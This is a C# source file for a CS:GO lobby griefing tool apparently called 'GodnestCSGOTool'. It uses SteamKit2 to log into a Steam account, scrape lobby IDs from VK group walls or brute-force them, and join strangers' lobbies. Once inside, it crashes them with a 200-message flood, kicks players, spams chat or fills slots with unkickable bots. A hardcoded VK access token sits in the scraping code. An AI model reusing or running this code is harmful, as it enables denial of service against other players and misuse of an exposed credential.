using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using SteamKit2;
using SteamKit2.GC.CSGO;
using SteamKit2.GC.CSGO.Internal;
using SteamKit2.GC;
using SteamKit2.Internal;
using System.Collections.Generic;
using System.Linq;
using Newtonsoft.Json;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Net;
namespace GodnestCSGOTool
{
    static class lobby
    {
        static SteamClient steamClient;
        static CallbackManager manager;

        static SteamGameCoordinator gameCoordinator;

        static SteamUser steamUser;

        static Handler _handler;

        static string username, password;
        static string authCode, twoFactorAuth;


        static Config Config;
        static public string statusteam = null;
        static public string chat = null;
        static public string debug = null;
        static string notmuchlobbys = null;
        static public ulong lobbyID = 0;
        static public ulong findlobbyid = 0;

        static public ulong howmucrashed = 0;
        static public ulong howmuchkicked = 0;

        [STAThread]
        static public void joininlobby(string cfgname)
        {
            Config = JsonConvert.DeserializeObject<Config>(File.ReadAllText("data/" + cfgname));
            username = Config.SteamLogin;
            password = Config.SteamPassword;
            steamClient = new SteamClient();
            manager = new CallbackManager(steamClient);
            steamUser = steamClient.GetHandler<SteamUser>();
            gameCoordinator = steamClient.GetHandler<SteamGameCoordinator>();
            steamClient.AddHandler(new Handler());
            _handler = steamClient.GetHandler<Handler>();

            manager.Subscribe<SteamClient.ConnectedCallback>(OnConnected);
            manager.Subscribe<SteamClient.DisconnectedCallback>(OnDisconnected);

            manager.Subscribe<SteamUser.LoggedOnCallback>(OnLoggedOn);
            manager.Subscribe<SteamUser.LoggedOffCallback>(OnLoggedOff);

            manager.Subscribe<SteamUser.UpdateMachineAuthCallback>(OnMachineAuth);

            manager.Subscribe<SteamGameCoordinator.MessageCallback>(OnMessageCall);



            // Ausgeklammert, weil du das dem Handler geben musst.
            /*statusteam = "LobbyID to Chat?");
            lobbyid = ulong.Parse(Console.ReadLine());*/

            statusteam = "Подкючаюсь к стиму...";

            steamClient.Connect();

            while (mainform.isjoinlobby)
            {
                manager.RunWaitCallbacks(TimeSpan.FromSeconds(1));
            }

        }
        static public void join()
        {
            _handler.JoinLobby();

        }
        static public void crash()
        {
            for (int i = 0; i <= 200; i++)
            {
                _handler.CrashSendMessage();
            }
        }
        static public void InviteMessage(string msg)
        {
            _handler.InviteMessage(msg);
        }
        static public void Findlobby()
        {
            findlobbyid = mainform.idofstart;
            while (mainform.startsearchlobby == true)
            {
                findlobbyid = findlobbyid + 1;
                mainform.lobbyid = findlobbyid;
                Task.Run(() => _handler.JoinLobby());
                statusteam = "Проверяю:" + findlobbyid;
                int i = 0;
                while (Handler.imdone != true)
                {
                    if (i >= 10)
                    {
                        Handler.imdone = true;
                        _handler.LeaveLobby(lobbyID);
                    }
                    i = i + 1;
                    Thread.Sleep(100);
                }
            }
        }
            static public void GetLobbys()
        {
            mainform.name = "CSGO Cheats OverWatch";
            while (mainform.autoparser == true)
            {
                statusteam = "Скачиваю лобби с беседки...";
                notmuchlobbys = "itsnotempty";
                WebClient client = new WebClient();
                string wall = client.DownloadString("https://api.vk.com/api.php?oauth=1&method=wall.get&extended=0&owner_id=-122614485&v=5.62&filter=all&count=100&access_token=fd7e96c28f38cf782c06396c50400167580169ced63eba3145c35968d81b62cd81accb7428ded612c7de3");
                Regex rgx = new Regex("[^0-9]");
                wall = rgx.Replace(wall, "");
                string[] lobbies = wall.Split(new string[] { "730" }, StringSplitOptions.None);
                Regex regex = new Regex(@"(109\d{15})");
                string besedka = "";
                try
                {
                    besedka = File.ReadAllText("badlobbys.txt");
                }
                catch (Exception)
                {
                    File.WriteAllText("badlobbys.txt", "");
                }
                foreach (var lobby in lobbies)
                {
                    var match = regex.Match(lobby);
                    if (match.Success)
                    {
                        ulong.TryParse(match.Groups[1].Value, out lobbyID);
                        if (lobbyID != 0)
                        {
                            if (notmuchlobbys.Contains(Convert.ToString(lobbyID)) == false)
                            {
                                notmuchlobbys = notmuchlobbys + lobbyID;
                                mainform.lobbyid = lobbyID;
                                if (besedka.Contains(Convert.ToString(lobbyID)) != true)
                                {
                                    Task.Run(() => _handler.JoinLobby());
                                    statusteam = "Подключаюсь:" + lobbyID;
                                    Thread.Sleep(500);
                                    if (mainform.autokick == true)
                                    {
                                        howmucrashed = howmucrashed + 1;
                                        statusteam = "Кикаю...";
                                    }
                                    if (mainform.autocrash == true)
                                    {
                                        howmucrashed = howmucrashed + 1;
                                        statusteam = "Крашу...";
                                    }
                                    if (mainform.nonkickablebots == true)
                                    {
                                        howmucrashed = howmucrashed + 1;
                                        statusteam = "Забиваю...";
                                    }
                                    int i = 0;
                                    while (Handler.imdone != true)
                                    {
                                        if (i >= 20)
                                        {
                                            Handler.imdone = true;
                                            _handler.LeaveLobby(lobbyID);
                                        }
                                        i = i + 1;
                                        Thread.Sleep(100);
                                    }
                                    statusteam = "Готово:" + lobbyID;
                                }
                            }
                        }
                    }
                }
                statusteam = "Все лобби проверенны!";
                Thread.Sleep(500);
                statusteam = "Скачиваю лобби с шелтера...";
                notmuchlobbys = "itsnotempty";
                wall = client.DownloadString("https://api.vk.com/api.php?oauth=1&method=wall.get&extended=0&owner_id=-123781326&v=5.62&filter=all&count=100&access_token=fd7e96c28f38cf782c06396c50400167580169ced63eba3145c35968d81b62cd81accb7428ded612c7de3");
                wall = rgx.Replace(wall, "");
                lobbies = wall.Split(new string[] { "730" }, StringSplitOptions.None);
                besedka = "";
                try
                {
                    besedka = File.ReadAllText("badlobbys.txt");
                }
                catch (Exception)
                {
                    File.WriteAllText("badlobbys.txt", "");
                }
                foreach (var lobby in lobbies)
                {
                    var match = regex.Match(lobby);
                    if (match.Success)
                    {
                        ulong.TryParse(match.Groups[1].Value, out lobbyID);
                        if (lobbyID != 0)
                        {
                            if (notmuchlobbys.Contains(Convert.ToString(lobbyID)) == false)
                            {
                                notmuchlobbys = notmuchlobbys + lobbyID;
                                mainform.lobbyid = lobbyID;
                                if (besedka.Contains(Convert.ToString(lobbyID)) != true)
                                {
                                    Task.Run(() => _handler.JoinLobby());
                                    statusteam = "Подключаюсь:" + lobbyID;
                                    Thread.Sleep(500);
                                    if (mainform.autokick == true)
                                    {
                                        howmucrashed = howmucrashed + 1;
                                        statusteam = "Кикаю...";
                                    }
                                    if (mainform.autocrash == true)
                                    {
                                        howmucrashed = howmucrashed + 1;
                                        statusteam = "Крашу...";
                                    }
                                    if (mainform.nonkickablebots == true)
                                    {
                                        howmucrashed = howmucrashed + 1;
                                        statusteam = "Забиваю...";
                                    }
                                    int i = 0;
                                    while (Handler.imdone != true)
                                    {
                                        if (i >= 20)
                                        {
                                            Handler.imdone = true;
                                            _handler.LeaveLobby(lobbyID);
                                        }
                                        i = i + 1;
                                        Thread.Sleep(100);
                                    }
                                    statusteam = "Готово:" + lobbyID;
                                }
                            }
                        }
                    }
                }
                statusteam = "Все лобби проверенны!";
                Thread.Sleep(500);
            }

        }

        static public void create()
        {
            _handler.createlobby();
        }
        static public void SendMessage()
        {
            _handler.sSendMessage();
        }
        static public void Kickguy()
        {
            _handler.KickMsg();
        }

        static public void SpamMessage()
        {
            while (mainform.crashlobby == true)
            {
                Thread.Sleep(200);
                _handler.SpamMessage();
            }
        }

        static void OnMessageCall(SteamGameCoordinator.MessageCallback callback)
        {
            if (callback.EMsg == 4004)
            {
                statusteam = "Подключен к Стиму!";
                var resp = new ClientGCMsgProtobuf<CMsgClientWelcome>(callback.Message);
            }
            else if (callback.EMsg == 6614)
            {
                var responseChat = new ClientGCMsgProtobuf<CMsgClientMMSLobbyChatMsg>(callback.Message);
                chat = chat + System.Text.Encoding.UTF8.GetString(StringToByteArray(getBetween(BitConverter.ToString(responseChat.Body.lobby_message).Replace("-", string.Empty), "6E616D65", "000B"))) + Environment.NewLine;
                File.WriteAllText("text.txt", BitConverter.ToString(responseChat.Body.lobby_message).Replace("-", string.Empty));
            }
            else if (callback.EMsg == 4004)
            {
                var resp = new ClientGCMsgProtobuf<CMsgClientWelcome>(callback.Message);
            }


        }
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            int Start, End;
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            else
            {
                return null;
            }
        }

        static void OnConnected(SteamClient.ConnectedCallback callback)
        {
            if (callback.Result != EResult.OK)
            {
                statusteam = "Не могу подключиться к стиму: {0}" + callback.Result;

                mainform.isjoinlobby = false;
                return;
            }

            statusteam = "Захожу в аккаунт..." + username;

            byte[] sentryHash = null;
            if (File.Exists("data/" + Config.SteamLogin + ".sentry"))
            {
                // if we have a saved sentry file, read and sha-1 hash it
                byte[] sentryFile = File.ReadAllBytes("data/" + Config.SteamLogin + ".sentry");
                sentryHash = CryptoHelper.SHAHash(sentryFile);
            }

            steamUser.LogOn(new SteamUser.LogOnDetails
            {
                Username = username,
                Password = password,

                // in this sample, we pass in an additional authcode
                // this value will be null (which is the default) for our first logon attempt
                AuthCode = authCode,

                // if the account is using 2-factor auth, we'll provide the two factor code instead
                // this will also be null on our first logon attempt
                TwoFactorCode = twoFactorAuth,

                // our subsequent logons use the hash of the sentry file as proof of ownership of the file
                // this will also be null for our first (no authcode) and second (authcode only) logon attempts
                SentryFileHash = sentryHash,
            });
        }

        static void OnDisconnected(SteamClient.DisconnectedCallback callback)
        {
            // after recieving an AccountLogonDenied, we'll be disconnected from steam
            // so after we read an authcode from the user, we need to reconnect to begin the logon flow again

            statusteam = "Отключен от стима, переподключение через 5 секунд...";

            Thread.Sleep(TimeSpan.FromSeconds(5));

            steamClient.Connect();
        }

        static void OnLoggedOn(SteamUser.LoggedOnCallback callback)
        {
            bool isSteamGuard = callback.Result == EResult.AccountLogonDenied;
            bool is2FA = callback.Result == EResult.AccountLoginDeniedNeedTwoFactor;

            if (isSteamGuard || is2FA)
            {

                if (is2FA)
                {
                    twoFactorAuth = Console.ReadLine();
                }
                else
                {
                    authCode = Console.ReadLine();
                }

                return;
            }

            if (callback.Result != EResult.OK)
            {
                mainform.isjoinlobby = false;
                return;
            }

            statusteam = "Зашел в аккаунт!";

            // at this point, we'd be able to perform actions on Steam
            ClientMsgProtobuf<CMsgClientGamesPlayed> msg = new ClientMsgProtobuf<CMsgClientGamesPlayed>(EMsg.ClientGamesPlayed, 64);
            CMsgClientGamesPlayed.GamePlayed item = new CMsgClientGamesPlayed.GamePlayed
            {
                game_id = (ulong)new GameID(730)
            };
            msg.Body.games_played.Add(item);

            steamClient.Send(msg);
            Thread.Sleep(5000);

            var clienthello = new ClientGCMsgProtobuf<CMsgClientHello>(4006);
            gameCoordinator.Send(clienthello, 730);
        }

        static void OnLoggedOff(SteamUser.LoggedOffCallback callback)
        {

        }
        static public void Exit()
        {
            Thread.Sleep(500);
            Environment.Exit(0);
        }

        static void OnMachineAuth(SteamUser.UpdateMachineAuthCallback callback)
        {

            // write out our sentry file
            // ideally we'd want to write to the filename specified in the callback
            // but then this sample would require more code to find the correct sentry file to read during logon
            // for the sake of simplicity, we'll just use "sentry.bin"

            int fileSize;
            byte[] sentryHash;
            using (var fs = File.Open("data/" + Config.SteamLogin + ".sentry", FileMode.OpenOrCreate, FileAccess.ReadWrite))
            {
                fs.Seek(callback.Offset, SeekOrigin.Begin);
                fs.Write(callback.Data, 0, callback.BytesToWrite);
                fileSize = (int)fs.Length;

                fs.Seek(0, SeekOrigin.Begin);
                using (var sha = new SHA1CryptoServiceProvider())
                {
                    sentryHash = sha.ComputeHash(fs);
                }
            }

            // inform the steam servers that we're accepting this sentry file
            steamUser.SendMachineAuthResponse(new SteamUser.MachineAuthDetails
            {
                JobID = callback.JobID,

                FileName = callback.FileName,

                BytesWritten = callback.BytesToWrite,
                FileSize = fileSize,
                Offset = callback.Offset,

                Result = EResult.OK,
                LastError = 0,

                OneTimePassword = callback.OneTimePassword,

                SentryFileHash = sentryHash,
            });

        }
    }
}